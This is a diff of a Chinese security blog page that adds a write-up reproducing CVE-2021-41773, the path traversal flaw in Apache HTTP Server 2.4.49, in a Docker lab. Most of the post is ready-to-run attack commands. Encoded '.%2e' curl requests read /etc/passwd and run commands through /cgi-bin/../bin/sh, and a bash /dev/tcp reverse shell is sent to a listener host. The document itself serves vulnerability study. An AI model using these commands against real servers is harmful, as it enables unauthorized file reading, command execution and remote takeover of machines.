@@ -6,18 +6,25 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="与其临渊羡鱼，不如退而结网。">
+    <meta name="description" content="0x00 前言Apache HTTP Server 2.4.49 版本对路径规范化所做的更改中存在一个路径穿越漏洞，攻击者可利用该漏洞读取到 Web 目录外的其他文件，如系统配置文件、网站源码等，甚至在特定情况下，攻击者可构造恶意请求执行命令，控制服务器。 0x01 影响版本1Apache HTTP Server 2.4.49  前置条件 穿越目录运行被访问。比如配置了  1&lt;Directo">
 <meta property="og:type" content="article">
 <meta property="og:title" content="CVE-2021-41773复现">
 <meta property="og:url" content="http://lvpsectime.github.io/post/c52e013e.html">
 <meta property="og:site_name" content="忆时光">
-<meta property="og:description" content="与其临渊羡鱼，不如退而结网。">
+<meta property="og:description" content="0x00 前言Apache HTTP Server 2.4.49 版本对路径规范化所做的更改中存在一个路径穿越漏洞，攻击者可利用该漏洞读取到 Web 目录外的其他文件，如系统配置文件、网站源码等，甚至在特定情况下，攻击者可构造恶意请求执行命令，控制服务器。 0x01 影响版本1Apache HTTP Server 2.4.49  前置条件 穿越目录运行被访问。比如配置了  1&lt;Directo">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://lvpsectime.github.io/post/c52e013e/image-20211124212009883.png">
+<meta property="og:image" content="http://lvpsectime.github.io/post/c52e013e/image-20211124212225104.png">
+<meta property="og:image" content="http://lvpsectime.github.io/post/c52e013e/image-20211124212543354.png">
+<meta property="og:image" content="http://lvpsectime.github.io/post/c52e013e/image-20211124212949876.png">
+<meta property="og:image" content="http://lvpsectime.github.io/post/c52e013e/image-20211124213838984.png">
+<meta property="og:image" content="http://lvpsectime.github.io/post/c52e013e/image-20211124213853252.png">
 <meta property="article:published_time" content="2021-10-07T08:45:46.000Z">
-<meta property="article:modified_time" content="2021-10-11T05:16:23.809Z">
+<meta property="article:modified_time" content="2021-11-24T13:39:36.439Z">
 <meta property="article:author" content="ca5tle">
 <meta property="article:tag" content="漏洞复现">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://lvpsectime.github.io/post/c52e013e/image-20211124212009883.png">
     
     
       
@@ -114,7 +121,7 @@
 
     </div>
     <div id="toc">
-      
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-number">2.</span> <span class="toc-text">0x01 影响版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">3.</span> <span class="toc-text">0x02 环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">4.</span> <span class="toc-text">0x03 漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">4.1.</span> <span class="toc-text">文件读取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">4.2.</span> <span class="toc-text">命令执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">4.3.</span> <span class="toc-text">反弹shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E5%8F%82%E8%80%83"><span class="toc-number">5.</span> <span class="toc-text">0x04 参考</span></a></li></ol>
     </div>
   </span>
 </div>
@@ -140,7 +147,7 @@
       
         <time datetime="2021-10-07T08:45:46.000Z" itemprop="datePublished">2021-10-07</time>
         
-        (Updated: <time datetime="2021-10-11T05:16:23.809Z" itemprop="dateModified">2021-10-11</time>)
+        (Updated: <time datetime="2021-11-24T13:39:36.439Z" itemprop="dateModified">2021-11-24</time>)
         
       
     </div>
@@ -160,7 +167,51 @@
   
 
   <div class="content" itemprop="articleBody">
-    
+    <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>Apache HTTP Server 2.4.49 版本对路径规范化所做的更改中存在一个路径穿越漏洞，攻击者可利用该漏洞读取到 Web 目录外的其他文件，如系统配置文件、网站源码等，甚至在特定情况下，攻击者可构造恶意请求执行命令，控制服务器。</p>
+<h2 id="0x01-影响版本"><a href="#0x01-影响版本" class="headerlink" title="0x01 影响版本"></a>0x01 影响版本</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Apache HTTP Server 2.4.49</span><br></pre></td></tr></table></figure>
+
+<p>前置条件</p>
+<p>穿越目录运行被访问。比如配置了 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Directory /&gt;Require all granted&lt;/Directory&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h2><p><strong>Dockerfile</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">FROM vulhub/httpd:2.4.49</span><br><span class="line"></span><br><span class="line">RUN set -ex \</span><br><span class="line">    &amp;&amp; sed -i &quot;s|#LoadModule cgid_module modules/mod_cgid.so|LoadModule cgid_module modules/mod_cgid.so|g&quot; /usr/local/apache2/conf/httpd.conf \</span><br><span class="line">    &amp;&amp; sed -i &quot;s|#LoadModule cgi_module modules/mod_cgi.so|LoadModule cgi_module modules/mod_cgi.so|g&quot; /usr/local/apache2/conf/httpd.conf \</span><br><span class="line">    &amp;&amp; sed -i &quot;s|#Include conf/extra/httpd-autoindex.conf|Include conf/extra/httpd-autoindex.conf|g&quot; /usr/local/apache2/conf/httpd.conf \</span><br><span class="line">    &amp;&amp; cat /usr/local/apache2/conf/httpd.conf \</span><br><span class="line">        | tr &#x27;\n&#x27; &#x27;\r&#x27; \</span><br><span class="line">        | perl -pe &#x27;s|&lt;Directory /&gt;.*?&lt;/Directory&gt;|&lt;Directory /&gt;\n    AllowOverride none\n    Require all granted\n&lt;/Directory&gt;|isg&#x27; \</span><br><span class="line">        | tr &#x27;\r&#x27; &#x27;\n&#x27; \</span><br><span class="line">        | tee /tmp/httpd.conf \</span><br><span class="line">&amp;&amp; mv /tmp/httpd.conf /usr/local/apache2/conf/httpd.conf</span><br></pre></td></tr></table></figure>
+
+<p>执行如下命令启动环境</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker build -t cve-2021-41773 .</span><br><span class="line">docker run -d -p 80:80 5f453ed6f9a4</span><br></pre></td></tr></table></figure>
+
+<p>进入容器修改Apache配置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it 5977a2464108 bash</span><br></pre></td></tr></table></figure>
+
+<p>修改配置文件<code>httpd.conf</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;Directory /&gt;</span><br><span class="line">    Require all granted</span><br><span class="line">&lt;/Directory&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/post/c52e013e/image-20211124212009883.png" alt="image-20211124212009883"></p>
+<p>重启容器</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker restart </span><br></pre></td></tr></table></figure>
+
+<p><img src="/post/c52e013e/image-20211124212225104.png" alt="image-20211124212225104"></p>
+<h2 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h2><h3 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v --path-as-is http://10.108.2.145/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p><img src="/post/c52e013e/image-20211124212543354.png" alt="image-20211124212543354"></p>
+<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl --data &quot;echo;id&quot; &#x27;http://10.108.2.145/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh&#x27;  # Linux</span><br><span class="line">curl --data &quot;echo;id&quot; &quot;http://10.108.2.145/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh&quot;  # Windows </span><br></pre></td></tr></table></figure>
+
+<p><img src="/post/c52e013e/image-20211124212949876.png" alt="image-20211124212949876"></p>
+<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>开启 nc 监听</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 7777</span><br></pre></td></tr></table></figure>
+
+<p>echo 命令重定向将反弹 shell 的命令写入文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --data &quot;echo;echo &#x27;bash -i &gt;&amp; /dev/tcp/10.108.2.152/7777 0&gt;&amp;1&#x27;&gt;&gt; /tmp/shell.sh&quot; &#x27;http://10.108.2.145/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>bash 反弹 shell 的文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --data &quot;echo;bash /tmp/shell.sh&quot; &#x27;http://10.108.2.145/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/post/c52e013e/image-20211124213838984.png" alt="image-20211124213838984"></p>
+<p><img src="/post/c52e013e/image-20211124213853252.png" alt="image-20211124213853252"></p>
+<h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a target="_blank" rel="noopener" href="http://www.hackdig.com/10/hack-503303.htm">http://www.hackdig.com/10/hack-503303.htm</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.o2oxy.cn/3702.html">https://www.o2oxy.cn/3702.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.runoob.com/docker/docker-tutorial.html">https://www.runoob.com/docker/docker-tutorial.html</a></p>
+
   </div>
 </article>
 
@@ -205,7 +256,7 @@
     </div>
 
     <div id="toc-footer" style="display: none">
-      
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-number">2.</span> <span class="toc-text">0x01 影响版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">3.</span> <span class="toc-text">0x02 环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">4.</span> <span class="toc-text">0x03 漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">4.1.</span> <span class="toc-text">文件读取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">4.2.</span> <span class="toc-text">命令执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">4.3.</span> <span class="toc-text">反弹shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E5%8F%82%E8%80%83"><span class="toc-number">5.</span> <span class="toc-text">0x04 参考</span></a></li></ol>
     </div>
 
     <div id="share-footer" style="display: none">
